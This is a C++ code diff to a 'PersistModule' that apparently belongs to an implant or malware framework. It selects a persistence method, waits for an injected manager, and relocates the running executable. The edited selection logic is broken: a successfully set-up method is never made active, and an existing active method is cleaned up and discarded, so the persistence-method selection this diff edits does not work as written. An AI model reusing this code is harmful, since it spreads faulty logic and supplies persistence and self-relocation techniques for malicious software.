@@ -64,6 +64,8 @@ void* PersistModule::getPublicInterface()
 // Main function
 void PersistModule::module_main()
 {
+  MLOG("Waiting for manager to be injected...");
+
   // We need to wait for the manager to be injected
   managerInterMtx.lock();
   managerInterMtx.unlock();
@@ -114,35 +116,36 @@ void PersistModule::module_main()
     return;
   }
 
-  // Okay, let's switch to the best one.
-  if(activeMethod)
-    activeMethod->cleanup();
-  activeMethod.reset();
-
   // While we're not persisting and there are still options
-  while(methods.size())
+  std::shared_ptr<PersistMethod> newMethod;
+  while (methods.size())
   {
-    activeMethod = methods[0];
-    if(activeMethod->setup())
+    newMethod = methods[0];
+    if (newMethod->setup())
       break;
 
     // Setup failed, clear
-    activeMethod.reset();
+    newMethod.reset();
     methods.erase(methods.begin());
+    newMethod = NULL;
   }
 
-  if(!activeMethod)
+  if(!newMethod && !activeMethod)
   {
     MERR("Persist failed, no supported methods for this system.");
+  } else if (newMethod && activeMethod && newMethod != activeMethod) {
+    if(activeMethod)
+      activeMethod->cleanup();
+    activeMethod.reset();
   }
 }
 
 void PersistModule::startMigrateTo(boost::filesystem::path& path, std::string& targetExecutableName)
 {
-#if NDEBUG
-  MLOG("Debug mode, not actually migrating to "<<path.str()<<"...");
+#if DEBUG
+  MLOG("Debug mode, not actually migrating to " << path.string() << "...");
 #else
-  if(manager->prepareToRelocate()){
+  if (manager->prepareToRelocate()){
     mInter->relocateEverything(path.c_str(), targetExecutableName.c_str());
   }
 #endif
